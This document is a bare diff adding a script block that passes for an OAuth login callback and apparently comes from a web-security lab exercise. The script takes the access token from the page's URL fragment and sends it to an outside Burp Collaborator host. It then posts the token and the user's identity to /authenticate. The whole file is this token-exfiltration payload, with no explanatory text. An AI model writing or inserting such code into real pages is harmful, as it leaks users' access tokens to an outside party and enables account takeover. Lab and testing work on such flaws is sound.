@@ -1,0 +1,25 @@
+<script>
+const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
+const token = urlSearchParams.get('access_token');
+fetch('https://x7581eceyx1toyng5ld2ltkfm6sygn.burpcollaborator.net/me', {
+    method: 'GET',
+    headers: {
+        'Authorization': 'Bearer ' + token,
+        'Content-Type': 'application/json'
+    }
+})
+.then(r => r.json())
+.then(j => 
+    fetch('/authenticate', {
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            email: j.email,
+            username: j.sub,
+            token: token
+        })
+    }).then(r => document.location = '/'))
+</script>
